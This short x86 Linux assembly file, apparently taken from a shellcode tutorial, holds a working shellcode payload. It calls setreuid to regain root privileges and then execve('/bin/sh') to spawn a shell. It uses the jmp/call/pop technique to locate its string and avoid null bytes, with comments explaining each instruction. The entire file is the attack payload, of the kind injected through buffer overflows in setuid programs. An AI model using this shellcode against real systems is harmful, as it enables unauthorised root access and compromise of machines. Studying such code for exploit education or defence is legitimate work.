; http://www.vividmachines.com/shellcode/shellcode.html
[SECTION .text]

global _start

_start:
    xor eax, eax
    mov al, 70  ; setreuid
    xor ebx, ebx
    xor ecx, ecx
    int 0x80

    jmp short ender

    starter:

    pop ebx     ;address of string
    xor eax, eax

    mov [ebx+7], al     ; puts a NULL where the N is in the string
    mov [ebx+8], ebx    ; puts the address of teh string to where the AAAA is
    mov [ebx+12], eax   ; put 4 null bytes into where the BBB is
    mov al, 11          ; execve
    lea ecx, [ebx+8]    ; load address of where AAAA was
    lea edx, [ebx+12]   ; load address of the NULLS
    int 0x80            ; shell

    ender:
    call starter
    db '/bin/shNAAAABBBB'
